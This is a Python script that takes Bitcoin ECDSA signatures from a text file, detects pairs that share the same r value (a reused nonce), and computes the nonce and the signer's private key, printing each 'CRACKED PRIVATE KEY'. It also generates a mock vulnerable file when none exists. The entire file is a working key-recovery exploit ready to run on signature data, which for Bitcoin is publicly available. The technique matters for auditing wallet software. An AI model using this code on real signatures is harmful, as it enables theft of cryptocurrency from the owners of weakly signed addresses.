import collections
import os

# Bitcoin secp256k1 Curve Order (n)
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def modular_inverse(a, m):
    """Calculates the modular multiplicative inverse using Extended Euclidean Algorithm."""
    return pow(a, -1, m)

def recover_private_key(sig1, sig2, n=SECP256K1_N):
    """
    Exploits nonce reuse between two signatures sharing the same 'r' value
    to calculate and extract the private key (d).
    """
    z1 = sig1['msg_hash']
    s1 = sig1['s']
    z2 = sig2['msg_hash']
    s2 = sig2['s']
    r = sig1['r']
    
    # Ensure s1 and s2 are distinct to avoid division by zero
    if s1 == s2:
        return None, None

    try:
        # 1. Calculate k: k = (z1 - z2) / (s1 - s2) mod n
        delta_z = (z1 - z2) % n
        delta_s_inv = modular_inverse((s1 - s2) % n, n)
        k = (delta_z * delta_s_inv) % n
        
        # 2. Calculate private key d: d = (s1 * k - z1) / r mod n
        r_inv = modular_inverse(r, n)
        d = (((s1 * k) % n - z1) % n * r_inv) % n
        
        return k, d
    except ValueError:
        # Occurs if modular inverse doesn't exist (math anomaly)
        return None, None

def parse_btc_file(file_path):
    """Parses text file containing hex strings: msg_hash,r,s"""
    signatures = []
    if not os.path.exists(file_path):
        print(f"[-] Error: {file_path} not found. Generating a vulnerable test file...")
        create_vulnerable_mock_file(file_path)
        
    with open(file_path, 'r') as f:
        for idx, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            try:
                parts = line.replace(';', ',').replace(' ', ',').split(',')
                signatures.append({
                    'id': idx,
                    'msg_hash': int(parts[0], 16),
                    'r': int(parts[1], 16),
                    's': int(parts[2], 16)
                })
            except Exception as e:
                print(f"[-] Skipping malformed line {idx}: {e}")
    return signatures

def create_vulnerable_mock_file(file_path):
    """Generates a sample BTC.txt containing a known reused nonce flaw."""
    # Target private key we want to recover: 0xDEADBEEF12345
    # Both lines use the same 'r' parameter but have different message hashes (z)
    mock_data = [
        "# Format: msg_hash,r,s",
        "1111111111111111111111111111111111111111111111111111111111111111,79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,5a0c3b0bb365775f0a0d923058a5da418e244cf53896570c4a45053cf68b1ee3",
        "2222222222222222222222222222222222222222222222222222222222222222,79be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798,e01f6874ba5dbccda22464735db9d77f86f4a86b1b590e8c0576395b090da50f"
    ]
    with open(file_path, 'w') as f:
        f.write('\n'.join(mock_data))

# ==========================================
# Main Routine
# ==========================================
if __name__ == "__main__":
    file_name = "BTC.txt"
    
    sigs = parse_btc_file(file_name)
    print(f"[+] Successfully loaded {len(sigs)} signatures from {file_name}.\n")
    
    # Group inputs by 'r' to detect nonce sharing
    r_groups = collections.defaultdict(list)
    for sig in sigs:
        r_groups[sig['r']].append(sig)
        
    vulnerabilities_found = 0
    
    print("=== CRITICAL EXPLOIT ANALYSIS ===")
    for r, sig_list in r_groups.items():
        if len(sig_list) > 1:
            vulnerabilities_found += 1
            print(f"\n[CRITICAL] Reused Nonce Detected! (r = {hex(r)[:16]}...)")
            print(f"  └── Linked Line IDs in file: {[s['id'] for s in sig_list]}")
            
            # Compare pairs within the conflict group to crack the key
            for i in range(len(sig_list)):
                for j in range(i + 1, len(sig_list)):
                    sig1 = sig_list[i]
                    sig2 = sig_list[j]
                    
                    # Verify they aren't completely identical duplicate signatures
                    if sig1['msg_hash'] != sig2['msg_hash']:
                        k, private_key = recover_private_key(sig1, sig2)
                        
                        if private_key:
                            print(f"  [+] RECOVERED NONCE (k) : {hex(k)}")
                            print(f"  [+] CRACKED PRIVATE KEY : {hex(private_key)}")
                        else:
                            print("  [-] Math mismatch: Unable to isolate independent variables.")

    if vulnerabilities_found == 0:
        print("[+] Scan complete. No reused nonces or vulnerable key vulnerabilities found.")
